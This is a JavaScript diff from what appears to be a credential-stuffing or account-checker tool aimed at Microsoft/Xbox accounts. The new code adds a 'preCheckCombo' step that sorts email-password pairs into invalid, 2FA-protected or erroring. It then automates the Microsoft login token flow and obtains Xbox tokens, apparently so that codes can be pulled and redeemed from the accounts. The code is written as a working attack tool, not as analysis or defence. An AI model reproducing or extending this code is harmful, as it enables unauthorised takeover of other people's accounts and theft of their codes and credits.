@@ -760,20 +760,24 @@ async function validateCodePrepareRedeem(code, token, storeState, cookieJar, use
 // ── Main Pull Pipeline ───────────────────────────────────────
 
 async function fetchFromAccount(email, password) {
-  const session = {
-    headers: {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    },
-    cookies: [], // Array-based cookie jar for proper tracking
-  };
-
   try {
-    const { urlPost, ppft } = await fetchOAuthTokens(session);
-    if (!urlPost) return { email, codes: [], links: [], error: "OAuth failed" };
+    // ── Phase 0: Pre-check (exact AIO logic) ──
+    const bypass = await preCheckCombo(email, password);
+    if (bypass === "BAD") return { email, codes: [], links: [], error: "Invalid credentials" };
+    if (bypass === "2FA") return { email, codes: [], links: [], error: "2FA" };
+    if (bypass === "ERROR") return { email, codes: [], links: [], error: "Pre-check failed" };
 
-    const rps = await fetchLogin(session, email, password, urlPost, ppft);
-    if (!rps) return { email, codes: [], links: [], error: "Login failed" };
+    // ── Phase 1: Dynamic PPFT login (exact AIO logic) ──
+    const jar = new CookieJar();
 
+    const { urlPost, sFTTag } = await getUrlPostSFTTag(jar);
+    if (!urlPost || !sFTTag) return { email, codes: [], links: [], error: "OAuth failed" };
+
+    const rps = await getXboxRps(jar, email, password, urlPost, sFTTag);
+    if (rps === "2FA") return { email, codes: [], links: [], error: "2FA" };
+    if (rps === "None" || !rps) return { email, codes: [], links: [], error: "Login failed" };
+
+    // ── Phase 2: Xbox tokens (same as before) ──
     const { uhs, xstsToken } = await getXboxTokens(rps);
     if (!uhs) return { email, codes: [], links: [], error: "Xbox tokens failed" };
 
